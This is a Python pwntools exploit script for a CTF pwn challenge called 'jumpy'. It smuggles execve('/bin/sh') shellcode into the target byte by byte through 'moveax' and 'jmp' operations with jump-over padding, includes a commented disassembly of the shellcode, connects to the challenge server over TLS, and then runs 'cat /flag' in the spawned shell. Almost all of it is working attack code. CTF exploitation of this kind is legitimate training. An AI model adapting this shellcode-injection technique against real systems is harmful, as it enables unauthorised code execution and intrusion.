#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys
import socket,ssl


FILENAME = "jumpy"
LIBCNAME = ""

hosts = ("7b0000001dc8a2af80ea0ddf-jumpy.challenge.master.allesctf.net","localhost","localhost")
ports = (31337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

MV = "moveax"
JMP = "jmp"
RET = "ret"

def hoge():
  global c
  pass

def add_inst(inst):
  c.recvuntil("> ")
  c.sendline(inst)

def mov(addr):
  add_inst(MV)
  c.sendline(str(addr))

def jmp(val):
  add_inst(JMP)
  c.sendline(str(val))

def ret():
  add_inst(RET)

def fin():
  add_inst("q")

def byte4(val):
  jmp(3)
  mov(0x01eb0000)

  for i in range(4):
    if val & ((0xff) << (i*8)) == 0:
      val += 0x90 << i*8
  print(hex(val))

  mov(val)

## exploit ###########################################

'''
  400080:	50                   	push   %rax
  400081:	48 31 d2             	xor    %rdx,%rdx
  400084:	48 31 f6             	xor    %rsi,%rsi
  400087:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
  40008e:	2f 73 68 
  400091:	53                   	push   %rbx
  400092:	54                   	push   %rsp
  400093:	5f                   	pop    %rdi
  400094:	b0 3b                	mov    $0x3b,%al
  400096:	0f 05                	syscall
  '''


def exploit():
  global c
  byte4(0x50)       # push
  byte4(0xd23148)   # xor
  byte4(0xf63148)   # xor

  mov(0x0068732f)
  jmp(3)
  mov(0x01eb0000)
  mov(0x90c38948)   # mov rbx, 

  byte4(0x20e3c148) # shl rbx, 32

  mov(0x6e69622f)
  jmp(3)
  mov(0x01eb0000)
  mov(0x90c18948)   # mov cbx, 

  byte4(0xcb0148) # add rbx, rcx
  byte4(0x53)
  byte4(0x54)
  byte4(0x5f)
  byte4(0x3bb0)

  # al must't be broken
  mov(0x0000003b)
  jmp(3)
  mov(0x01eb0000)
  mov(0x9090050f)   # mov cbx, 

  fin()

  c.sendline("cat /flag")



## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = True
        context.load_default_certs()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(s, server_hostname=rhp1["host"])
        ssl_sock.connect((rhp1["host"],rhp1["port"]))
        c = remote.fromsocket(ssl_sock)

      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
